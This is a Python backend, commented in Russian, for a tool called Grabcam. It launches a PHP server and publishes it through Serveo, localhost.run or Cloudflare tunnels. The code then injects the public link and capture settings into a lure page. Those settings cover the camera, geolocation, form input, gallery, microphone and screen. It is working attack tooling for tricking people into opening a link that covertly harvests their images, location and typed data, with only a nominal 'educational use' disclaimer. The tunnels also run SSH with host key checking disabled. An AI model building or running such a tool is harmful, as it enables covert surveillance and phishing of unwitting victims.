#!/usr/bin/env python3
"""
Backend Grabcam: запуск PHP-сервера и туннелей (Serveo, localhost.run, Cloudflare).
Портировано из OSINT HTML V2.0. Только для образовательных целей и тестирования с разрешения.
"""
import json
import os
import re
import shutil
import signal
import subprocess
import threading
import time
from typing import Any, Optional

_PHP_PORT_DEFAULT = 3333
_PHP_PORTS_RANGE = (3333, 3334, 3335, 3336, 3337)  # при старте выбирается первый свободный

# Паттерны ссылок туннелей
_SERVEO_LINK_RE = re.compile(
    r"https://[0-9a-zA-Z\-]+\.(?:serveo\.net|serveousercontent\.com)",
    re.IGNORECASE,
)
_LOCALHOST_RUN_LINK_RE = re.compile(
    r"https://[0-9a-zA-Z\-]+\.lhr\.life",
    re.IGNORECASE,
)
_CLOUDFLARE_LINK_RE = re.compile(
    r"https://[0-9a-zA-Z\-]+\.trycloudflare\.com",
    re.IGNORECASE,
)

_state = {
    "proc": None,
    "proc_ssh": None,
    "proc_cloudflared": None,
    "link": None,
    "local_url": None,
    "running": False,
    "error": None,
    "method": None,
    "started_at": None,
    "php_port": None,  # порт PHP в текущей сессии; при остановке сбрасывается
}
_lock = threading.Lock()
_work_dir: Optional[str] = None


def _php_available() -> bool:
    return shutil.which("php") is not None


def _ssh_available() -> bool:
    return shutil.which("ssh") is not None


def _cloudflared_available() -> bool:
    return shutil.which("cloudflared") is not None


def _port_in_use(port: int) -> bool:
    try:
        import socket
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.5)
            return s.connect_ex(("127.0.0.1", port)) == 0
    except Exception:
        return False


def _find_free_port() -> Optional[int]:
    """Первый свободный порт из _PHP_PORTS_RANGE — чтобы на другом устройстве/сессии не конфликтовать."""
    for port in _PHP_PORTS_RANGE:
        if not _port_in_use(port):
            return port
    return None


def _extract_serveo_link(text: str) -> Optional[str]:
    m = _SERVEO_LINK_RE.search(text)
    return m.group(0) if m else None


def _get_work_dir() -> str:
    return _work_dir or os.getcwd()


def _get_options_file() -> str:
    return os.path.join(_get_work_dir(), "options.json")


def _get_features_json() -> str:
    default = {"camera": True, "geo": True, "form": True, "gallery": False, "mic": False, "screen": False}
    path = _get_options_file()
    if os.path.isfile(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
            for k in default:
                if k in data and isinstance(data[k], bool):
                    default[k] = data[k]
        except (OSError, ValueError):
            pass
    return json.dumps(default, ensure_ascii=False)


def _refresh_payload(link: str) -> None:
    wd = _get_work_dir()
    html_tpl = os.path.join(wd, "grabcam.html")
    index2 = os.path.join(wd, "index2.html")
    index_main = os.path.join(wd, "index.html")
    if not os.path.isfile(html_tpl):
        return
    try:
        with open(html_tpl, "r", encoding="utf-8", errors="replace") as f:
            content = f.read()
        content = content.replace("forwarding_link", link).replace("GRABCAM_FEATURES_JSON", _get_features_json())
        with open(index2, "w", encoding="utf-8") as f:
            f.write(content)
        with open(index_main, "w", encoding="utf-8") as f:
            f.write(content)
    except OSError:
        pass


def _ensure_serveo_payload_ready() -> None:
    port = _state.get("php_port") or _PHP_PORT_DEFAULT
    _refresh_payload(f"http://127.0.0.1:{port}")
    wd = _get_work_dir()
    tpl_php = os.path.join(wd, "template.php")
    index_php = os.path.join(wd, "index.php")
    if os.path.isfile(tpl_php):
        try:
            with open(tpl_php, "r", encoding="utf-8", errors="replace") as f:
                content = f.read().replace("forwarding_link", f"http://127.0.0.1:{port}")
            with open(index_php, "w", encoding="utf-8") as f:
                f.write(content)
        except OSError:
            pass


def _update_serveo_payload_link(link: str) -> None:
    _refresh_payload(link)
    wd = _get_work_dir()
    tpl_php = os.path.join(wd, "template.php")
    index_php = os.path.join(wd, "index.php")
    if os.path.isfile(tpl_php):
        try:
            with open(tpl_php, "r", encoding="utf-8", errors="replace") as f:
                content = f.read().replace("forwarding_link", link)
            with open(index_php, "w", encoding="utf-8") as f:
                f.write(content)
        except OSError:
            pass


def _worker_serveo() -> None:
    port = _state.get("php_port") or _PHP_PORT_DEFAULT
    wd = _get_work_dir()
    with _lock:
        _state["running"] = True
        _state["link"] = None
        _state["error"] = None
        _state["proc"] = None
        _state["proc_ssh"] = None
        _state["local_url"] = None
        _state["started_at"] = time.time()

    proc_php = None
    proc_ssh = None
    link = None
    try:
        proc_php = subprocess.Popen(
            ["php", "-S", f"127.0.0.1:{port}"],
            cwd=wd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        with _lock:
            _state["proc"] = proc_php
        time.sleep(0.8)
        if proc_php.poll() is not None:
            with _lock:
                _state["running"] = False
                _state["proc"] = None
                _state["error"] = f"PHP-сервер не запустился (порт {port}). Проверьте наличие PHP."
            return
        _ensure_serveo_payload_ready()
        ssh_opts = [
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "ServerAliveInterval=60",
            "-o", "ConnectTimeout=15",
            "-R", f"80:127.0.0.1:{port}",
            "serveo.net",
        ]
        for ssh_port in (22, 443):
            cmd = (["ssh", "-p", "443"] if ssh_port == 443 else ["ssh"]) + ssh_opts
            try:
                proc_ssh = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1,
                    start_new_session=True,
                )
            except FileNotFoundError:
                with _lock:
                    _state["running"] = False
                    _state["proc"] = None
                    _state["error"] = "SSH не найден. Установите openssh-client (apt install openssh-client)."
                return
            except Exception as e:
                with _lock:
                    _state["error"] = str(e)
                continue
            with _lock:
                _state["proc_ssh"] = proc_ssh
            deadline = time.monotonic() + 25
            buf = []
            while time.monotonic() < deadline:
                if proc_ssh.poll() is not None:
                    break
                line = proc_ssh.stdout.readline()
                if not line:
                    time.sleep(0.3)
                    continue
                buf.append(line)
                link = _extract_serveo_link(line)
                if link:
                    break
            if not link and buf:
                link = _extract_serveo_link("".join(buf))
            if link:
                with _lock:
                    _state["link"] = link
                _update_serveo_payload_link(link)
                return
            try:
                if proc_ssh.poll() is None:
                    proc_ssh.terminate()
                    time.sleep(1)
                    if proc_ssh.poll() is None:
                        proc_ssh.kill()
            except Exception:
                pass
            proc_ssh = None
            with _lock:
                _state["proc_ssh"] = None
        with _lock:
            _state["error"] = (
                "Serveo недоступен (часто в РФ или за фаерволом). Выберите «localhost.run» или «Cloudflare Proxy»."
            )
            _state["running"] = False
            _state["proc"] = None
            _state["proc_ssh"] = None
        for p in (proc_ssh, proc_php):
            if p and p.poll() is None:
                try:
                    p.terminate()
                except Exception:
                    pass
    except Exception as e:
        with _lock:
            _state["error"] = str(e)
            _state["running"] = False
            _state["proc"] = None
            _state["proc_ssh"] = None
        for p in (proc_ssh, proc_php):
            if p and p.poll() is None:
                try:
                    p.terminate()
                except Exception:
                    pass


def _worker_localhost_run() -> None:
    port = _state.get("php_port") or _PHP_PORT_DEFAULT
    wd = _get_work_dir()
    with _lock:
        _state["running"] = True
        _state["link"] = None
        _state["error"] = None
        _state["proc"] = None
        _state["proc_ssh"] = None
        _state["local_url"] = None
        _state["started_at"] = time.time()
    proc_php = None
    proc_ssh = None
    link = None
    try:
        proc_php = subprocess.Popen(
            ["php", "-S", f"127.0.0.1:{port}"],
            cwd=wd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        with _lock:
            _state["proc"] = proc_php
        time.sleep(0.8)
        if proc_php.poll() is not None:
            with _lock:
                _state["running"] = False
                _state["proc"] = None
                _state["error"] = "PHP-сервер не запустился."
            return
        _ensure_serveo_payload_ready()
        cmd = [
            "ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
            "-o", "ServerAliveInterval=60", "-o", "ConnectTimeout=20",
            "-R", f"80:127.0.0.1:{port}", "nokey@localhost.run",
        ]
        try:
            proc_ssh = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                start_new_session=True,
            )
        except FileNotFoundError:
            with _lock:
                _state["running"] = False
                _state["proc"] = None
                _state["error"] = "SSH не найден. Установите openssh-client."
            return
        with _lock:
            _state["proc_ssh"] = proc_ssh
        deadline = time.monotonic() + 30
        buf = []
        while time.monotonic() < deadline:
            if proc_ssh.poll() is not None:
                break
            line = proc_ssh.stdout.readline()
            if not line:
                time.sleep(0.3)
                continue
            buf.append(line)
            m = _LOCALHOST_RUN_LINK_RE.search(line)
            if m:
                link = m.group(0)
                break
        if not link and buf:
            m = _LOCALHOST_RUN_LINK_RE.search("".join(buf))
            link = m.group(0) if m else None
        if link:
            with _lock:
                _state["link"] = link
            _update_serveo_payload_link(link)
            return
        with _lock:
            _state["error"] = "Не удалось получить ссылку localhost.run. Проверьте интернет и доступность localhost.run."
            _state["running"] = False
            _state["proc"] = None
            _state["proc_ssh"] = None
        for p in (proc_ssh, proc_php):
            if p and p.poll() is None:
                try:
                    p.terminate()
                except Exception:
                    pass
    except Exception as e:
        with _lock:
            _state["error"] = str(e)
            _state["running"] = False
            _state["proc"] = None
            _state["proc_ssh"] = None
        for p in (proc_ssh, proc_php):
            if p and p.poll() is None:
                try:
                    p.terminate()
                except Exception:
                    pass


def _worker_cloudflared() -> None:
    port = _state.get("php_port") or _PHP_PORT_DEFAULT
    wd = _get_work_dir()
    with _lock:
        _state["running"] = True
        _state["link"] = None
        _state["error"] = None
        _state["proc"] = None
        _state["proc_ssh"] = None
        _state["proc_cloudflared"] = None
        _state["local_url"] = None
        _state["started_at"] = time.time()
    proc_php = None
    proc_cf = None
    link = None
    try:
        proc_php = subprocess.Popen(
            ["php", "-S", f"127.0.0.1:{port}"],
            cwd=wd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        with _lock:
            _state["proc"] = proc_php
        time.sleep(0.8)
        if proc_php.poll() is not None:
            with _lock:
                _state["running"] = False
                _state["proc"] = None
                _state["error"] = "PHP-сервер не запустился."
            return
        _ensure_serveo_payload_ready()
        try:
            proc_cf = subprocess.Popen(
                ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}"],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                start_new_session=True,
            )
        except FileNotFoundError:
            with _lock:
                _state["running"] = False
                _state["proc"] = None
                _state["error"] = "cloudflared не найден. Установите: https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/"
            return
        with _lock:
            _state["proc_cloudflared"] = proc_cf
        deadline = time.monotonic() + 25
        buf = []
        while time.monotonic() < deadline:
            if proc_cf.poll() is not None:
                break
            line = proc_cf.stdout.readline()
            if not line:
                time.sleep(0.3)
                continue
            buf.append(line)
            m = _CLOUDFLARE_LINK_RE.search(line)
            if m:
                link = m.group(0)
                break
        if not link and buf:
            m = _CLOUDFLARE_LINK_RE.search("".join(buf))
            link = m.group(0) if m else None
        if link:
            with _lock:
                _state["link"] = link
            _update_serveo_payload_link(link)
            return
        with _lock:
            _state["error"] = "Не удалось получить ссылку Cloudflare. Проверьте интернет."
            _state["running"] = False
            _state["proc"] = None
            _state["proc_cloudflared"] = None
        for p in (proc_cf, proc_php):
            if p and p.poll() is None:
                try:
                    p.terminate()
                except Exception:
                    pass
    except Exception as e:
        with _lock:
            _state["error"] = str(e)
            _state["running"] = False
            _state["proc"] = None
            _state["proc_cloudflared"] = None
        for p in (proc_cf, proc_php):
            if p and p.poll() is None:
                try:
                    p.terminate()
                except Exception:
                    pass


def _worker_php_only(port: int) -> None:
    wd = _get_work_dir()
    with _lock:
        _state["running"] = True
        _state["local_url"] = f"http://127.0.0.1:{port}"
        _state["error"] = None
        _state["proc"] = None
        _state["link"] = None
        _state["started_at"] = time.time()
    proc = None
    try:
        proc = subprocess.Popen(
            ["php", "-S", f"0.0.0.0:{port}"],
            cwd=wd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        with _lock:
            _state["proc"] = proc
        proc.wait()
    except Exception as e:
        with _lock:
            _state["error"] = str(e)
    finally:
        with _lock:
            _state["running"] = False
            _state["proc"] = None


class ToolGrabcam:
    """Запуск PHP-сервера Grabcam и туннелей Serveo, localhost.run, Cloudflare."""

    def __init__(self, work_dir=None):
        self.work_dir = os.path.abspath(work_dir or os.getcwd())

    def run(self, data=None) -> dict[str, Any]:
        global _work_dir
        data = data or {}
        params = data
        work_dir = data.get("work_dir") or self.work_dir
        _work_dir = os.path.abspath(work_dir)

        method = (params.get("method") or "php_only").strip().lower()
        if method not in ("serveo", "php_only", "localhost_run", "cloudflared"):
            method = "php_only"

        options = {
            "camera": bool(params.get("camera", True)),
            "geo": bool(params.get("geo", True)),
            "form": bool(params.get("form", True)),
            "gallery": bool(params.get("gallery", False)),
            "mic": bool(params.get("mic", False)),
            "screen": bool(params.get("screen", False)),
        }
        try:
            with open(_get_options_file(), "w", encoding="utf-8") as f:
                json.dump(options, f, ensure_ascii=False, indent=2)
        except OSError:
            pass
        with _lock:
            _state["error"] = None
            _state["method"] = method
            if _state.get("running"):
                return {"success": False, "error": "Сервер уже запущен. Сначала нажмите «Остановить»."}

        if not _php_available():
            return {"success": False, "error": "PHP не найден. Установите PHP (apt install php и т.д.)."}

        port = _find_free_port()
        if port is None:
            return {"success": False, "error": f"Все порты {_PHP_PORTS_RANGE[0]}-{_PHP_PORTS_RANGE[-1]} заняты. Остановите другие сессии или освободите порт."}
        with _lock:
            _state["php_port"] = port
        _refresh_payload(f"http://127.0.0.1:{port}")

        if method == "php_only":
            if not os.path.isdir(_work_dir):
                return {"success": False, "error": "Рабочая папка не найдена."}
            thread = threading.Thread(target=_worker_php_only, args=(port,), daemon=True)
            thread.start()
            time.sleep(0.5)
            with _lock:
                return {
                    "success": True,
                    "started": True,
                    "local_url": _state.get("local_url") or f"http://127.0.0.1:{port}",
                    "message": f"PHP-сервер запущен на порту {port}. Откройте ссылку в браузере.",
                }
        elif method == "cloudflared":
            if not _cloudflared_available():
                return {"success": False, "error": "cloudflared не найден. Скачайте: https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/"}
            thread = threading.Thread(target=_worker_cloudflared, daemon=True)
            thread.start()
            return {"success": True, "started": True, "message": "Запуск PHP и Cloudflare Tunnel… Ссылка появится через 5–15 сек."}
        else:
            if not _ssh_available():
                return {"success": False, "error": "SSH не найден. Установите openssh-client (apt install openssh-client)."}
            if method == "localhost_run":
                thread = threading.Thread(target=_worker_localhost_run, daemon=True)
                thread.start()
                return {"success": True, "started": True, "message": "Запуск PHP и localhost.run… Ссылка через 10–30 сек. (рекомендуется для РФ.)"}
            else:
                thread = threading.Thread(target=_worker_serveo, daemon=True)
                thread.start()
                return {"success": True, "started": True, "message": "Запуск PHP и Serveo… Ссылка через 10–25 сек."}

    def stop_run(self) -> tuple[bool, str]:
        with _lock:
            proc = _state.get("proc")
            proc_ssh = _state.get("proc_ssh")
            proc_cf = _state.get("proc_cloudflared")
            port = _state.get("php_port")
            if not proc and not proc_ssh and not proc_cf:
                return False, "Ничего не запущено."
            _state["proc"] = None
            _state["proc_ssh"] = None
            _state["proc_cloudflared"] = None

        def kill_process(p):
            if p is None:
                return
            try:
                if hasattr(os, "killpg") and hasattr(os, "getpgid") and p.pid:
                    try:
                        pgid = os.getpgid(p.pid)
                        os.killpg(pgid, signal.SIGKILL)
                    except (ProcessLookupError, OSError, AttributeError):
                        try:
                            p.kill()
                        except Exception:
                            pass
                else:
                    p.kill()
            except ProcessLookupError:
                pass
            except Exception:
                try:
                    p.terminate()
                except Exception:
                    pass

        # Сначала убиваем SSH/cloudflared, затем PHP — порт освобождается процессом PHP
        kill_process(proc_ssh)
        kill_process(proc_cf)
        kill_process(proc)
        # Ждём завершения процесса PHP (до 2 сек), чтобы порт точно освободился
        if proc and proc.pid:
            try:
                proc.wait(timeout=2)
            except Exception:
                pass
        # Дополнительно ждём, пока порт станет свободен (до 3 сек)
        if port is not None:
            deadline = time.monotonic() + 3
            while time.monotonic() < deadline and _port_in_use(port):
                time.sleep(0.15)
        with _lock:
            _state["running"] = False
            _state["link"] = None
            _state["local_url"] = None
            _state["error"] = None
            _state["method"] = None
            _state["started_at"] = None
            _state["php_port"] = None
        return True, "Остановлено. Порт освобождён."

    def get_run_status(self) -> dict:
        with _lock:
            link = _state.get("link")
            local_url = _state.get("local_url")
            running = _state.get("running", False)
            err = _state.get("error")
            method = _state.get("method")
            started_at = _state.get("started_at")
        if not running and not link and not local_url:
            return {"running": False, "link": None, "local_url": None, "error": err, "method": None, "started_at": None}
        return {
            "running": running,
            "link": link,
            "local_url": local_url,
            "error": err,
            "method": method,
            "started_at": started_at,
        }
